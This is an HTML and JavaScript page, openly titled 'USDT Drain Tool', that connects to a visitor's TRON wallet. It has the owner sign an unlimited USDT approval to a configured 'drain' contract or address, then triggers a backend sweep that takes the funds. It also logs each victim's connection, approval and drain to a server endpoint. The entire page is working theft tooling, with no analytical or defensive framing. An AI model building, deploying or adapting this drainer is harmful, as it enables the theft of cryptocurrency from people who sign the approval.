<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>USDT Drain Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            padding: 2rem 1rem;
            color: #f1f5f9;
        }

        .container {
            max-width: 700px;
            margin: 0 auto;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-size: 1.8rem;
            font-weight: 700;
            background: linear-gradient(135deg, #60a5fa, #c084fc);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.25rem;
        }

        .sub {
            color: #94a3b8;
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
            border-left: 2px solid #3b82f6;
            padding-left: 0.75rem;
        }

        .btn {
            background: #3b82f6;
            border: none;
            color: white;
            font-weight: 600;
            padding: 0.8rem 1.5rem;
            border-radius: 60px;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.2s ease;
            width: 100%;
            margin-top: 0.5rem;
        }

        .btn-secondary {
            background: #334155;
        }

        .btn-secondary:hover {
            background: #475569;
        }

        .btn-danger {
            background: #dc2626;
        }

        .btn-danger:hover {
            background: #b91c1c;
        }

        .btn-success {
            background: #10b981;
        }

        .btn:hover {
            transform: translateY(-2px);
            filter: brightness(1.05);
        }

        .btn:active {
            transform: translateY(1px);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 0.8rem 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .info-label {
            font-weight: 500;
            color: #94a3b8;
        }

        .info-value {
            font-family: monospace;
            word-break: break-all;
            text-align: right;
            max-width: 60%;
        }

        .address-badge {
            background: #1e293b;
            padding: 0.25rem 0.75rem;
            border-radius: 40px;
            font-family: monospace;
            font-size: 0.8rem;
        }

        .status {
            background: #0f172a;
            border-radius: 20px;
            padding: 0.8rem 1rem;
            margin-top: 1rem;
            font-size: 0.85rem;
            font-family: monospace;
            border-left: 3px solid #3b82f6;
        }

        .flex {
            display: flex;
            gap: 0.8rem;
            flex-wrap: wrap;
        }

        .flex .btn {
            flex: 1;
            margin-top: 0;
        }

        input {
            background: #0f172a;
            border: 1px solid #334155;
            padding: 0.7rem 1rem;
            border-radius: 40px;
            color: white;
            width: 100%;
            font-family: monospace;
            margin: 0.5rem 0;
        }

        label {
            font-size: 0.75rem;
            color: #94a3b8;
            margin-top: 0.5rem;
            display: block;
        }

        hr {
            border-color: #334155;
            margin: 1rem 0;
        }
        
        .spinner {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-left: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        /* Wallet Selector Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.8);
            backdrop-filter: blur(8px);
        }
        .modal-content {
            background: #1e293b;
            margin: 15% auto;
            padding: 2rem;
            border-radius: 32px;
            width: 90%;
            max-width: 400px;
            border: 1px solid #475569;
            text-align: center;
        }
        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin: 24px 0;
        }
        .wallet-option {
            background: #0f172a;
            padding: 12px 16px;
            border-radius: 48px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            transition: all 0.2s;
            border: 1px solid #334155;
        }
        .wallet-option:hover {
            background: #3b82f6;
            transform: translateX(4px);
        }
        .wallet-icon {
            width: 28px;
            height: 28px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }
        .wallet-name {
            font-weight: 600;
            font-size: 1rem;
        }
        .close {
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            color: #94a3b8;
        }
        .close:hover {
            color: white;
        }
        .selected-wallet-badge {
            background: #10b981;
            color: #0f172a;
            font-weight: bold;
            padding: 4px 12px;
            border-radius: 40px;
            font-size: 12px;
            margin-left: 8px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>💸 USDT Drain Tool</h1>
        <div class="sub">Multi-Wallet Support | TRC-20 | One-click approval + sweep</div>

        <!-- Wallet Connection Area -->
        <div id="walletStatusArea">
            <button id="showWalletModalBtn" class="btn">🔌 Connect Wallet</button>
        </div>
        <div id="connectedWalletInfo" style="display: none;">
            <div class="info-row">
                <span class="info-label">📍 Address</span>
                <span class="info-value address-badge" id="addressDisplay"></span>
            </div>
            <div class="info-row">
                <span class="info-label">💳 Wallet</span>
                <span class="info-value" id="walletNameDisplay">—</span>
            </div>
            <div class="info-row">
                <span class="info-label">💰 USDT Balance</span>
                <span class="info-value" id="usdtBalance">—</span>
            </div>
            <div class="info-row">
                <span class="info-label">⚡ TRX Balance</span>
                <span class="info-value" id="trxBalance">—</span>
            </div>
        </div>
    </div>

    <!-- Approval + Drain -->
    <div class="card" id="actionCard" style="display: none;">
        <div class="info-row">
            <span class="info-label">🎯 Spender (contract / EOA)</span>
            <span class="info-value address-badge" id="spenderAddress">—</span>
        </div>
        <div class="info-row">
            <span class="info-label">📄 Max approval value</span>
            <span class="info-value" id="maxApprove">—</span>
        </div>

        <label>🔓 Approve amount (USDT)</label>
        <div class="flex">
            <input type="text" id="approveAmount" placeholder="e.g. 1000 or 'max'" value="max">
            <button id="approveBtn" class="btn-secondary">✅ Approve USDT</button>
        </div>

        <hr>

        <button id="drainBtn" class="btn-danger">💀 Drain USDT</button>
        <div id="statusMsg" class="status">⏳ Please connect a wallet above.</div>
    </div>
</div>

<!-- Wallet Selection Modal -->
<div id="walletModal" class="modal">
    <div class="modal-content">
        <span class="close">&times;</span>
        <h3 style="margin-bottom: 16px;">Select Wallet</h3>
        <div class="wallet-list" id="walletList">
            <!-- Wallets will be populated dynamically -->
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/tronweb@6.3.0/dist/TronWeb.js"></script>
<script type="module">
    // --- IMPORTS and GLOBALS ---
    let userAddress = null;
    let tronWebInstance = null;
    let activeAdapter = null;
    let configData = { drainAddress: '', drainContract: '', maxApprove: '' };
    let usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    
    // Wallet Adapters Map (Dynamic Injection)
    let adapters = new Map();

    // Helper: Delay
    function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

    // Helper: TronWeb instance creator (static for compatibility)
    function getTronWeb(provider) {
        if (provider && provider.tronWeb && provider.tronWeb.ready) return provider.tronWeb;
        return new TronWeb({ fullHost: 'https://api.trongrid.io', headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {} });
    }

    // --- Load Backend Config ---
    async function loadConfig() {
        try {
            const res = await fetch('/api/config');
            const data = await res.json();
            configData = {
                drainAddress: data.drainAddress || '',
                drainContract: data.drainContract || '',
                maxApprove: data.maxApprove || '115792089237316195423570985008687907853269984665640564039457584007913129639935'
            };
            if (data.usdtContract) usdtContractAddress = data.usdtContract;
            document.getElementById('spenderAddress').innerText = configData.drainContract || configData.drainAddress || '❌ Not set';
            document.getElementById('maxApprove').innerText = configData.maxApprove === '115792089237316195423570985008687907853269984665640564039457584007913129639935'
                ? '∞ (unlimited)' : configData.maxApprove;
        } catch(e) {
            console.error('Config error', e);
            document.getElementById('statusMsg').innerHTML = '⚠️ Failed to load backend config.';
        }
    }

    // --- Wallet Detection (Multi-Wallet) ---
    async function detectWallets() {
        const walletList = [];
        
        // 1. TronLink
        if (window.tronLink && window.tronLink.ready) {
            walletList.push({
                name: 'TronLink',
                icon: '🔗',
                connect: async () => {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                    const address = window.tronLink.defaultAddress.base58;
                    const provider = window.tronLink;
                    return { address, provider, tronWeb: provider.tronWeb };
                }
            });
        }
        
        // 2. Trust Wallet
        if (window.trustwallet && window.trustwallet.tronLink) {
            walletList.push({
                name: 'Trust Wallet',
                icon: '🔒',
                connect: async () => {
                    const address = window.trustwallet.tronLink.defaultAddress.base58;
                    return { address, provider: window.trustwallet, tronWeb: window.trustwallet.tronLink.tronWeb };
                }
            });
        }
        
        // 3. OKX Wallet
        if (window.okxwallet && window.okxwallet.tronLink) {
            walletList.push({
                name: 'OKX Wallet',
                icon: '🟠',
                connect: async () => {
                    const address = window.okxwallet.tronLink.defaultAddress.base58;
                    return { address, provider: window.okxwallet, tronWeb: window.okxwallet.tronLink.tronWeb };
                }
            });
        }
        
        // 4. Binance Wallet
        if (window.binance && window.binance.tronLink) {
            walletList.push({
                name: 'Binance Wallet',
                icon: '🟡',
                connect: async () => {
                    const address = window.binance.tronLink.defaultAddress.base58;
                    return { address, provider: window.binance, tronWeb: window.binance.tronLink.tronWeb };
                }
            });
        }
        
        // 5. TokenPocket
        if (window.tokenpocket && window.tokenpocket.tron) {
            walletList.push({
                name: 'TokenPocket',
                icon: '📱',
                connect: async () => {
                    // TokenPocket uses different method
                    const res = await window.tokenpocket.requestTron({ method: 'tron_requestAccounts' });
                    const address = res[0];
                    const tronWebInstance = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                    tronWebInstance.setAddress(address);
                    return { address, provider: window.tokenpocket, tronWeb: tronWebInstance };
                }
            });
        }
        
        // 6. WalletConnect (Generic EVM support for MetaMask, Rabby, etc.)
        // For simplicity, we add a WalletConnect option that uses external libs, but it's heavy to embed fully.
        // However, we can implement a simple flag.
        if (typeof window.ethereum !== 'undefined') {
            walletList.push({
                name: 'MetaMask / EVM (via WalletConnect)',
                icon: '🦊',
                connect: async () => {
                    // For EVM wallets, you would typically connect via WalletConnect v2.
                    // For demo simplicity, we show that it's possible but recommend using official WalletConnect implementation.
                    alert('WalletConnect v2 integration requires additional setup (projectId). Please contact developer to implement full WalletConnect support.');
                    throw new Error('WalletConnect not fully implemented in this demo.');
                }
            });
        }

        return walletList;
    }

    // --- UI: Populate Wallet Modal ---
    async function initWalletSelector() {
        const wallets = await detectWallets();
        const walletContainer = document.getElementById('walletList');
        if (!walletContainer) return;
        walletContainer.innerHTML = '';
        if (wallets.length === 0) {
            walletContainer.innerHTML = '<div class="wallet-option" style="justify-content:center;">No supported wallets found. Please install TronLink, Trust Wallet, or OKX Wallet.</div>';
            return;
        }
        for (const w of wallets) {
            const walletDiv = document.createElement('div');
            walletDiv.className = 'wallet-option';
            walletDiv.innerHTML = `
                <div class="wallet-icon">${w.icon}</div>
                <div class="wallet-name">${w.name}</div>
            `;
            walletDiv.onclick = async () => {
                document.getElementById('walletModal').style.display = 'none';
                setButtonLoading(document.getElementById('showWalletModalBtn'), true);
                try {
                    const { address, provider, tronWeb } = await w.connect();
                    if (address) {
                        userAddress = address;
                        activeAdapter = { provider, name: w.name };
                        tronWebInstance = tronWeb || getTronWeb(provider);
                        // Update UI
                        document.getElementById('showWalletModalBtn').style.display = 'none';
                        document.getElementById('connectedWalletInfo').style.display = 'block';
                        document.getElementById('actionCard').style.display = 'block';
                        document.getElementById('addressDisplay').innerText = address.slice(0,6)+'...'+address.slice(-4);
                        document.getElementById('walletNameDisplay').innerHTML = `${w.name} <span class="selected-wallet-badge">Connected</span>`;
                        await updateBalances(address);
                        await logEvent('wallet_connected', address);
                        document.getElementById('statusMsg').innerHTML = `✅ Connected via ${w.name}. You can now approve USDT.`;
                    }
                } catch (err) {
                    console.error('Wallet connection error:', err);
                    document.getElementById('statusMsg').innerHTML = `❌ Connection failed: ${err.message}`;
                } finally {
                    setButtonLoading(document.getElementById('showWalletModalBtn'), false);
                }
            };
            walletContainer.appendChild(walletDiv);
        }
    }

    // Helper: Update Balances
    async function updateBalances(address) {
        if (!address) return;
        try {
            const res = await fetch('/api/balance', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address })
            });
            if (!res.ok) throw new Error('Balance fetch failed');
            const data = await res.json();
            document.getElementById('usdtBalance').innerText = data.usdt.toFixed(2) + ' USDT';
            document.getElementById('trxBalance').innerText = data.trx.toFixed(2) + ' TRX';
        } catch(err) {
            document.getElementById('usdtBalance').innerText = 'Error';
            document.getElementById('trxBalance').innerText = 'Error';
        }
    }

    // Helper: Log Event
    async function logEvent(type, address, txId = '', amount = '') {
        try {
            await fetch('/api/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type, address, txId, amount })
            });
        } catch(e) { console.warn('event log failed', e); }
    }

    // Approve USDT
    async function approveUSDT(spender, amountRaw) {
        if (!tronWebInstance || !userAddress) throw new Error('Wallet not connected');
        const contract = await tronWebInstance.contract().at(usdtContractAddress);
        let amountWei;
        const isMax = (amountRaw === 'max' || amountRaw === '' || amountRaw.toLowerCase() === 'max');
        if (isMax) {
            amountWei = configData.maxApprove;
        } else {
            let amountNum = parseFloat(amountRaw);
            if (isNaN(amountNum)) throw new Error('Invalid amount');
            amountWei = Math.floor(amountNum * 1e6).toString();
        }
        const tx = await contract.approve(spender, amountWei).send();
        await logEvent('approve_signed', userAddress, tx, amountRaw);
        return tx;
    }

    // Sweep
    async function callSweep() {
        if (!userAddress) throw new Error('No wallet connected');
        const res = await fetch('/api/sweep', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: userAddress })
        });
        const data = await res.json();
        if (!data.success) throw new Error(data.error || 'Sweep failed');
        await logEvent('drain_sent', userAddress, data.txId, '');
        return data;
    }

    // --- UI Helpers ---
    function setButtonLoading(button, isLoading) {
        if (!button) return;
        if (isLoading) {
            button.disabled = true;
            const originalText = button.textContent;
            button.setAttribute('data-original-text', originalText);
            button.innerHTML = `${originalText} <span class="spinner"></span>`;
        } else {
            button.disabled = false;
            const originalText = button.getAttribute('data-original-text');
            if (originalText) {
                button.textContent = originalText;
                button.removeAttribute('data-original-text');
            }
        }
    }

    // --- Event Handlers ---
    async function handleApprove() {
        if (!tronWebInstance || !userAddress) {
            alert('Connect wallet first');
            return;
        }
        const spender = configData.drainContract || configData.drainAddress;
        if (!spender) {
            alert('No drain contract or address configured on backend');
            return;
        }
        const amountInput = document.getElementById('approveAmount').value.trim();
        const statusDiv = document.getElementById('statusMsg');
        setButtonLoading(document.getElementById('approveBtn'), true);
        try {
            const tx = await approveUSDT(spender, amountInput);
            statusDiv.innerHTML = `✅ Approved! TX: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx.slice(0,10)}...</a>`;
        } catch (err) {
            statusDiv.innerHTML = `❌ Approve failed: ${err.message}`;
        } finally {
            setButtonLoading(document.getElementById('approveBtn'), false);
        }
    }

    async function handleDrain() {
        if (!userAddress) {
            alert('Connect wallet first');
            return;
        }
        const statusDiv = document.getElementById('statusMsg');
        setButtonLoading(document.getElementById('drainBtn'), true);
        try {
            const result = await callSweep();
            statusDiv.innerHTML = `💀 Drained successfully! TX: <a href="https://tronscan.org/#/transaction/${result.txId}" target="_blank">${result.txId.slice(0,10)}...</a>`;
            setTimeout(() => updateBalances(userAddress), 4000);
        } catch (err) {
            statusDiv.innerHTML = `❌ Drain error: ${err.message}. Make sure approval is done first.`;
        } finally {
            setButtonLoading(document.getElementById('drainBtn'), false);
        }
    }

    // --- Modal Control ---
    function initModal() {
        const modal = document.getElementById('walletModal');
        const btn = document.getElementById('showWalletModalBtn');
        const span = document.getElementsByClassName('close')[0];
        btn.onclick = () => { modal.style.display = 'block'; };
        span.onclick = () => { modal.style.display = 'none'; };
        window.onclick = function(event) {
            if (event.target == modal) { modal.style.display = 'none'; }
        };
    }

    // --- INITIALIZATION ---
    async function init() {
        await loadConfig();
        initModal();
        await initWalletSelector();
        document.getElementById('approveBtn').addEventListener('click', handleApprove);
        document.getElementById('drainBtn').addEventListener('click', handleDrain);
        document.getElementById('statusMsg').innerHTML = '🟢 Ready. Click "Connect Wallet" above.';
        // Check for wallets and update modal
        const wallets = await detectWallets();
        if (wallets.length === 0) {
            document.getElementById('statusMsg').innerHTML = '⚠️ No supported wallets detected. Please install TronLink, Trust Wallet, or OKX Wallet.';
        }
    }
    init();
</script>
</body>
</html>
